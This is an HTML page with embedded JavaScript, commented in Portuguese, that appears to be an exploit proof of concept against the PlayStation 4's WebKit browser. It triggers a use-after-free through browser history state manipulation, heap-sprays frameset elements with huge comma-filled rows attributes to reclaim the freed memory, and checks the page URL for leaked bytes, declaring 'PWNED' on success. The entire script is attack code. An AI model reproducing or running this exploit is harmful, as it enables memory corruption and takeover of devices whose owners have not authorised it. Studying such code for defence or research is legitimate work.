<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - 680KB UTF-16 Sweep</title>
<style>
    body { background-color: #000; color: #ff00ff; font-family: monospace; padding: 20px; }
    button { 
        padding: 20px; width: 100%; margin-bottom: 10px;
        font-weight: bold; font-size: 16px; cursor: pointer; 
        border: 2px solid #f0f; background: #202; color: #fff;
        text-transform: uppercase;
    }
    button:hover { background: #f0f; color: #000; }
    #log { border: 1px solid #555; margin-top: 20px; padding: 10px; white-space: pre-wrap; height: 350px; overflow-y: scroll;}
    .success { color: #fff; background-color: #aa00aa; padding: 5px; font-weight: bold; font-size: 1.2em;}
</style>
</head>
<body>
<h2>PS4 WebKit - 680KB Sweep (Targeting UTF-16)</h2>
<div id="status">Pronto para o ataque dobrado...</div>

<button onclick="runDoubleSweep()">INICIAR VARREDURA 85K (UTF-16)</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");
function log(m, type="") { 
    const d = document.createElement("div");
    if(type) d.className = type;
    d.textContent = m;
    logEl.appendChild(d);
    logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

var keepAlive = [];

async function runDoubleSweep() {
    logEl.innerHTML = "";
    keepAlive = []; 
    statusEl.innerText = "Rodando...";

    // === FASE 1: TRIGGER UAF ===
    log("1. Disparando UAF (Criando buraco de ~680KB)...");
    
    let size = 977;
    const STEP = 14461;

    for(let i = 0; i < 48; i++) {
        let frag = "V".repeat(size); 
        history.pushState({}, "", "#" + frag);
        // O slice divide por 2, mas o WebKit multiplica por 2 (UTF-16).
        // Resultado líquido: O tamanho na memória é igual ao tamanho original da string 'frag'.
        history.replaceState({}, "", "#" + frag.slice(0, frag.length >> 1));
        
        if(i % 6 === 0) setTimeout(() => history.back(), 0);
        size += STEP;
        await sleep(2); 
    }
    
    await sleep(50); // Pausa essencial

    // === FASE 2: FRAMESET SWEEP (DOBRADO) ===
    // Alvo calculado: 85.089 vírgulas.
    // Vamos varrer de 84.000 até 86.000.
    
    const START = 84000;
    const END = 86000;
    const STEP_SIZE = 16; 
    
    statusEl.innerText = `2. Varrendo: ${START} - ${END} vírgulas...`;
    log(`Iniciando varredura pesada (High Memory)...`);
    log(`Alvo central: ~85.000 vírgulas`);

    let current = START;
    let batch = 0;

    while(current < END) {
        try {
            let payload = ",".repeat(current);
            let f = document.createElement("frameset");
            f.rows = payload;
            keepAlive.push(f);
        } catch(e) {
            log("Erro de memória: " + e.message);
        }
        
        current += STEP_SIZE;
        batch++;
        
        if(batch % 100 === 0) {
            statusEl.innerText = `Spraying... (${current} / ${END})`;
            await sleep(15); 
        }
    }

    log(`Spray Completo! ${keepAlive.length} objetos gigantes criados.`);
    log("Aguardando estabilização...");
    await sleep(200);

    // === FASE 3: VERIFICAÇÃO ===
    statusEl.innerText = "3. Verificando...";
    let url = document.URL;
    let changed = false;
    let sample = "";
    
    // Procura por qualquer alteração no padrão 'V'
    // Aumentei o range de busca para garantir
    for(let i=1000; i<5000; i++) {
        if(url.charCodeAt(i) !== 0x56) { // 0x56 é 'V'
            changed = true;
            for(let k=0; k<16; k++) {
                let code = url.charCodeAt(i+k);
                sample += code.toString(16).padStart(2,'0') + " ";
            }
            break;
        }
    }

    if(changed) {
        log("!!! JACKPOT !!!", "success");
        log("A memória foi reclamada no modo UTF-16!");
        log("Dados encontrados: " + sample);
        statusEl.innerText = "PWNED: 680KB RECLAIMED";
        statusEl.style.backgroundColor = "#aa00aa";
    } else {
        log("Falha: Ainda vendo apenas 'V'.");
        log("Se falhar agora, o problema não é tamanho, é TIMING (Race Condition).");
    }
}
</script>
</body>
</html>
